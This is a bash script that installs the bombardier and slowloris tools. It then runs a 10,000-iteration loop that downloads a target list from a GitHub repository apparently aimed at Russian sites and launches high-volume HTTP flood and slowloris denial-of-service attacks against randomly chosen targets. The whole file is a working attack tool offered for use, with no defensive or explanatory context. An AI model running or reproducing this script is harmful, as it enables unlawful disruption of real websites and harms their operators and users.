#!/bin/bash
yum install -y epel-release
wget https://storage.googleapis.com/golang/getgo/installer_linux
chmod +x ./installer_linux
./installer_linux 
source /root/.bash_profile
go install github.com/codesenberg/bombardier@latest
yum install -y python36
pip3.6 install slowloris
for i in {1..10000}; do
	wget https://raw.githubusercontent.com/russki-korabl-idi-nakhui/russian_propaganda/main/list.txt -O bitches.txt
	shuf -n 10 bitches.txt > few_bitches.txt
        xargs -a few_bitches.txt -I{} -d'\n' bash -c "slowloris --sleeptime 0 --https --sockets 1000 --randuseragents {} & > /dev/null" 
	shuf -n 2 bitches.txt > few_bitches.txt
	xargs -a few_bitches.txt -I{} -d'\n' bash -c "bombardier -c 5000 -d 100s -l {} &" 
	sleep 101
	ps -ef | grep 'slowloris' | grep -v grep | awk '{print $2}' | xargs -r kill -9
	ps -ef | grep 'bombardier' | grep -v grep | awk '{print $2}' | xargs -r kill -9

done

